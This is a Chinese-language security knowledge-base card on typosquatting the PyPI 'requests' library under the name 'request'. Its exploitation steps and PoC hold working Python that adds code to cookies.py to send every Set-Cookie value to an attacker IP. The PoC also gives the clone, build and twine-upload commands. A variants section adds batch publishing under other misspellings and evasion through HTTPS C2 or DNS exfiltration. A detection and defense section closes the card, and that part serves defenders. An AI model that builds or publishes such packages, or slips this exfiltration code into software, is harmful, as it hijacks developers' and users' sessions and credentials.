---
id: cloud-cicd-pypi-typosquat-requests-cookie-exfil
title: PyPI 拼写抢注 requests→request：克隆官方包源码植入 Cookie 外传，pip install 后静默劫持会话
type: scenario
domain: cloud
path: cloud/ci-cd
technique: pypi-typosquat-requests-cookie-exfil
aliases:
- requests 拼写抢注
- PyPI typosquatting
- request 恶意包
- pip install request
- Cookie 外传供应链
- OWASP LLM 供应链案例
tags:
- supply-chain
- pypi
- typosquatting
- python
- requests
- cookie-theft
- session-hijack
- llm
- owasp-llm
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V270
  verified_at: '2026-11-07T19:31:18+08:00'
  notes: 已对照原文《详解OWASP TOP 10 For LLM漏洞（上）》第3节 Supply Chain 及全部35张图核对：git clone psf/requests、修改 cookies.py 中 extract_cookies_to_jar、__title__ 改为 request、python3 -m build、twine upload（__token__+API Token）、pip3 install request、安装日志 request-2.31.0、collect.php 日志中外传 aihelper.livemail.com 与 chatbotresearcher.cloudcity.com 的 sessionToken、pip-audit 与 pypi-scan 识别 request 等细节均与正文/图14-25、31一致；原文外传 IP 为 20.10.210.10（已放大图15确认），卡内一致。原文未给出受影响组件版本，属攻击技术，affected_versions 保持 null。dedup：唯一 exact 为自身；后续候选 pep517 build-backend RCE、npm preinstall 蠕虫、litellm 投毒、accesskey tools typosquat、dependency confusion、optional dependency takeover 均为不同包/不同外传机制，非同一利用链；dup-scan 无本篇 pair。未验证点：未复跑恶意包构建与 twine 上传；原文未给出 collect.php 服务端代码。
---

## 一句话结论

把官方 `requests` 源码克隆下来，在 `requests/cookies.py` 的 Cookie 解析路径里加入“把 `Set-Cookie` 值 POST 到攻击者服务器”的代码，只把发行包元数据 `__title__` 从 `requests` 改成 `request`（模块目录仍叫 `requests`，导入方式不变），构建后 `twine upload` 到 PyPI；受害者一旦手误执行 `pip3 install request`，应用仍能 `import requests` 正常工作，但每个 HTTP 响应里的会话 Cookie/Bearer 上下文都会被静默外传，造成账号会话劫持。

## 原理

- **发行名与导入名分离**：pip 按发行包名（distribution name，来自 `setup.py`/`pyproject.toml`/`__title__` 等元数据）解析和安装，Python 按顶层模块目录名（`import requests` 对应 `requests/` 目录）导入。攻击者可以把发行名写成 `request`（少一个 s 的常见拼写错误），包内仍放 `requests/` 模块，于是受害者 `pip install request` 后 `import requests` 依旧成功——调用的却是攻击者的副本。
- **复用官方源码降低怀疑**：文章直接克隆 `psf/requests`，保持绝大部分代码与官方一致，只在 `requests/cookies.py` 的 `extract_cookies_to_jar` 中插入外传逻辑。对使用方来说 API、行为、异常类型都与官方一致，功能测试很难发现异常。
- **外传点选在 Cookie 解析**：`extract_cookies_to_jar(jar, request, response)` 是 requests 处理每个响应 `Set-Cookie` 的必经路径。恶意版本在正常调用 `jar.extract_cookies(res, req)` 后，遍历 `response._original_response.msg`，把 `Set-Cookie:` 行拆成 key/value，组装 JSON `{"cookie": {...}}`，再用 `requests.post("http://<attacker>/collect.php", json=...)` 发到攻击者服务器；由于走的是正常 HTTP 请求，应用日志里通常只看到一次普通外联。
- **为什么能打中 LLM 应用**：很多 LLM 工具/聊天应用的后端用 Python `requests` 调用模型 API 或抓取网页，进程里持有用户会话 `sessionToken`、`Authorization: Bearer` 等凭据；恶意包在每次请求/响应时都能看到 Cookie 头，文章的外传日志中出现了 `aihelper.livemail.com` 和 `chatbotresearcher.cloudcity.com` 的 `sessionToken`。
- **为什么现有扫描容易漏**：`pip-audit` 按“包名+版本”匹配已知 CVE，`request` 是 PyPI 上合法存在的新包，没有 CVE 记录；它也不会判断“发行名 request 与顶层模块 requests 不一致”这种仿冒特征。需要专门的 typosquatting 扫描（如 pypi-scan）或人工核对元数据。
- **版本/元数据细节**：文章构建出的 wheel 为 `request-0.0.1-py3-none-any.whl`/`request-0.0.1.tar.gz`，但包内 `requests/__version__.py` 仍写 `__version__ = "2.31.0"`；安装日志显示 `request-2.31.0`（pip 展示的是模块自报版本或元数据差异），容易让使用者以为是官方 requests 2.31.0。

## 触发条件

- 攻击者拥有 PyPI 账号/上传令牌，能发布一个与热门包名相近的发行包（如 `request`、`reqeusts` 等）。
- 目标开发者/运维在安装依赖时手误（`pip3 install request`），或依赖文件里写错包名，且没有锁定哈希/私有源校验。
- 目标应用使用 `requests` 库发起 HTTP 请求，且请求/响应中含敏感 Cookie、Bearer Token 或会话头。
- 恶意包能在目标环境正常导入（顶层模块名与官方一致，或目标原本未安装 requests，恶意包直接提供该模块）。
- 攻击者服务器可接收外联（文章用 `http://20.10.210.10/collect.php`；真实场景可用 HTTPS 域名/CDN 规避）。

## 利用步骤

1. 克隆官方仓库：`git clone https://github.com/psf/requests.git`，保留官方目录结构与大部分代码。
2. 修改 `requests/cookies.py` 的 `extract_cookies_to_jar`：在正常 Cookie 解析后加入遍历 `Set-Cookie`、组装 JSON 并 POST 到攻击者 `collect.php` 的逻辑（文章代码见 PoC）。
3. 修改 `requests/__version__.py` 的 `__title__ = "request"`（发行名拼写错误），保持目录名 `requests/` 与 `import requests` 不变；`__version__` 可保留 `2.31.0` 以降低怀疑。
4. 在干净 venv 中构建：`python3 -m build`，生成 `request-0.0.1-py3-none-any.whl` 与 sdist。
5. 发布：`twine upload dist/*`（PyPI 用户名 `__token__`，密码为 API Token）；确认 `pip3 install request` 可安装并成功 `import requests`。
6. 等待受害者安装并运行；在攻击者 `collect.php`/日志中接收 `{"cookie": {...}}`，提取 `sessionToken` 等凭据进行会话劫持。
7. 也可把包名换成其他常见拼写错误（`reqeusts`、`requestss`、`request` 等），并用同一套生成/发布流程批量投放。

## PoC

恶意 `requests/cookies.py` 片段（核心逻辑，保留原函数签名与正常 Cookie 解析）：

```python
import json
import requests  # 同包内自引用，实际可用 urllib 避免递归

def extract_cookies_to_jar(jar, request, response):
    if not (hasattr(response, "_original_response") and response._original_response):
        return
    req = MockRequest(request)
    res = MockResponse(response._original_response.msg)
    jar.extract_cookies(res, req)

    # 外传 Set-Cookie
    for line in str(response._original_response.msg).split("\n"):
        if line.startswith("Set-Cookie:"):
            cookie_string = line[len("Set-Cookie:"):].strip()
            key_value = cookie_string.split(";", 1)[0].split("=", 1)
            if len(key_value) == 2:
                payload = {"cookie": {key_value[0].strip(): key_value[1].strip()}}
                requests.post("http://20.10.210.10/collect.php",
                              headers={"Content-Type": "application/json"},
                              data=json.dumps(payload))
```

构建与发布：

```bash
git clone https://github.com/psf/requests.git
# 修改 requests/cookies.py 与 requests/__version__.py（__title__ = "request"）
python3 -m venv venv && source venv/bin/activate
python3 -m build
twine upload dist/*
# 受害者侧：pip3 install request
```

## 变体与关联

- 变体：不改 Cookie 路径，改为在 `requests/sessions.py` 的 `send`/`request` 中记录 URL、请求头 `Authorization`、请求体，或在使用 `requests.get/post` 时外传完整请求；覆盖面更大但更容易被流量告警发现。
- 变体：把外传逻辑放在 `requests/__init__.py` 导入时执行，安装/导入即触发，不依赖业务发请求。
- 变体：使用同形异义域名（如 `requests.xxx`）或 HTTPS C2、DNS 外带，降低明文 HTTP 外联特征。
- 关联：[[cloud-cicd-accesskey-tools-typosquat-sdk-endpoint-hijack]]（仿冒安全工具依赖并劫持云 SDK 端点，同属“typosquatting + 凭据外传”）、[[cloud-cicd-pypi-optional-dependency-name-takeover]]（PyPI 包名接管）、[[cloud-cicd-dependency-confusion-public-package-name-collision]]（公共仓库同名包劫持）。
- 关联：[[ai-security-supply-chain-slopsquatting-hallucinated-package-registration]]（AI/LLM 语境下的包名抢注）、[[ai-security-supply-chain-litellm-pypi-pth-stealer-k8s-backdoor]]（PyPI 包安装期执行的凭据窃取）。

## 检测与防御

- **依赖侧**：使用 `pypi-scan` 等 typosquatting 扫描器检查新依赖；核对发行包名与顶层模块名是否一致（`pip show -f <pkg>` 看文件列表）；`pip-audit` 只能查已知 CVE，不能替代名称仿冒检测。
- **安装侧**：锁定 `requirements.txt` 版本与哈希（`--require-hashes`）；优先使用内部镜像/私有源并做包名白名单；安装前审查 `setup.py`/`pyproject.toml`、`__version__.py`、`cookies.py` 等敏感文件；对来源不明的新包先在隔离环境安装并抓包观察。
- **运行侧**：监控应用进程的异常外联（尤其是到新域名/裸 IP 的 HTTP POST）；对 `requests` 进程的出站目标做域名白名单；对 `Set-Cookie`/`Authorization` 等敏感头进日志脱敏并限制外发。
- **检测特征**：PyPI 上出现 `request` 等与 `requests` 仅差一个字符、下载量低、源码与官方高度相似但 `cookies.py` 多出网络请求；安装日志中 `request-2.31.0` 之类“发行名与版本不自洽”的记录；应用访问 `collect.php` 等可疑路径。
- **响应**：发现后立即卸载仿冒包、轮换被外传的会话令牌与 API Key、审计该时段的所有外联与登录记录。
